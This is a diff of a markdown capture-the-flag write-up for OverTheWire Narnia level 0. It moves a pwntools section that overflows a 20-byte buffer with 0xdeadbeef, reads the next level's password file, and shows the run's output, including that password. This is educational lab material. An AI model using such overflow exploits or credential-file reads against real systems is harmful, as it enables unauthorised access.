@@ -1,3 +1,39 @@
+----
+
+### Using pwntools
+```Python
+from pwn import *
+
+context(arch='i386', os='linux')
+s = ssh(user='narnia0', host='narnia.labs.overthewire.org', password='narnia0', port=2226)
+sh = s.run('/narnia/narnia0')
+sh.sendline('A'*20 + p32(0xdeadbeef))
+sh.sendline('cat /etc/narnia_pass/narnia1')
+while 1:
+    print(sh.recvline())
+# log.info('Flag: '+sh.recvline().split('\n')[0])
+s.close()
+
+```
+
+Gets us:
+```bash
+root@da7a0fa7b53e:/tutorial/CTF/narnia/level0# python exploit.py
+[+] Connecting to narnia.labs.overthewire.org on port 2226: Done
+[!] Couldn't check security settings on 'narnia.labs.overthewire.org'
+[+] Opening new channel: '/narnia/narnia0': Done
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
+
+val: 0xdeadbeef
+
+$ efeidiedae
+```
+
+----
+
+
 Log in into the game:
 ```bash
 ssh narnia0@narnia.labs.overthewire.org -p 2226 # password narnia0
@@ -267,37 +303,6 @@ val: 0xdeadbeef
 cat /etc/narnia_pass/narnia1
 efeidiedae
 
-```
-
-### Using pwntools
-```Python
-from pwn import *
-
-context(arch='i386', os='linux')
-s = ssh(user='narnia0', host='narnia.labs.overthewire.org', password='narnia0', port=2226)
-sh = s.run('/narnia/narnia0')
-sh.sendline('A'*20 + p32(0xdeadbeef))
-sh.sendline('cat /etc/narnia_pass/narnia1')
-while 1:
-    print(sh.recvline())
-# log.info('Flag: '+sh.recvline().split('\n')[0])
-s.close()
-
-```
-
-Gets us:
-```bash
-root@da7a0fa7b53e:/tutorial/CTF/narnia/level0# python exploit.py
-[+] Connecting to narnia.labs.overthewire.org on port 2226: Done
-[!] Couldn't check security settings on 'narnia.labs.overthewire.org'
-[+] Opening new channel: '/narnia/narnia0': Done
-Correct val's value from 0x41414141 -> 0xdeadbeef!
-
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
-
-val: 0xdeadbeef
-
-$ efeidiedae
 ```
 
 ### Resources
